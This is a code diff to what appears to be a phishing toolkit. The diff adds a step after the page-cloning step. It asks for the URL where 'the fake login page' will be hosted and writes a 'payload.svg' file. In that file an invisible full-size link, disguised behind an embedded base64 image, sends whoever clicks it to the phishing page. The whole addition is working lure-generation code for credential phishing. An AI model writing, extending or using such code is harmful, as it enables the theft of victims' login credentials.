@@ -133,6 +133,30 @@ while True:
             f.write(clone.prettify())
 
         print(f'{green_start}page-clone.html was generated.{green_end}')
+        
+        image_url_input = input(f'{red_start}Enter a direct image URL or press Enter to use the default image: ')
+        if not image_url_input:
+            image_url_input = 'https://support.rocketspark.com/hc/article_attachments/900002328266/Screenshot_2020-07-10_15.37.48.png'
+
+        base64_image_data = get_base64_image_data(image_url_input)
+
+        redirect_url = input(f'{red_start}Enter the URL where you will host the fake login page:{red_end} ')
+
+        svg_template = f"""
+        <svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                <a xlink:href="{redirect_url}">
+                    <rect x="0" y="0" width="100%" height="100%" fill-opacity="0" />
+                    <image width="130" height="25" x="-100" y="5" xlink:href="{base64_image_data}" />
+                </a>
+            </g>
+        </svg>
+        """
+
+        with open('payload.svg', 'w', encoding='utf-8') as f:
+            f.write(svg_template)
+
+        print(f'{green_start}[+] Generated payload.svg{green_end}')
 
     elif option == '4':
          
